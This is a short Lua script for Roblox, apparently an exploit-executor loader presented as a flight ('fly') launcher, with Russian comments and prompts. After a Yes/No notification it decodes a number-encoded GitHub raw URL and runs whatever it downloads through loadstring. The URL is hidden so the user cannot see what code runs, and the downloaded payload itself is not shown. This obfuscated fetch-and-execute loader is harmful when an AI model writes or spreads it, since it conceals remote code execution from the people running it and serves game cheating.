-- Функция для дешифровки, теперь определена в глобальной области видимости
function decode_url(code_array)
    local res = ''
    for i in ipairs(code_array) do
        res = res .. string.char(code_array[i] / 105)
    end
    return res
end

local function callback(Text)
    if Text == "Да" then
        -- Обновленный список ASCII-кодов для нового URL
        loadstring(game:HttpGet(decode_url({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,8715,8400,8820,9135,11655,11550,10500,10605,11970,12075,10920,10185,10605,12495,4935,11970,10605,10710,12075,4935,10920,10605,10185,10500,12075,4935,11445,10185,11025,11550,4935,7245,12600,12180,7350,11340,12705,4830,7035,12600,12600}), true))()
    elseif Text == "Нет" then
        game:GetService("StarterGui"):SetCore("SendNotification",{
            Title = "Очень жаль!:(",
            Text = "Тун тун тун...", 
            Duration = 2
        })
    end
end

local NotificationBindable = Instance.new("BindableFunction")
NotificationBindable.OnInvoke = callback

game.StarterGui:SetCore("SendNotification", {
    Title = "Полёт готов к старту",
    Text = "Запускать?",
    Icon = "",
    Duration = 10,
    Button1 = "Да",
    Button2 = "Нет",
    Callback = NotificationBindable,
})
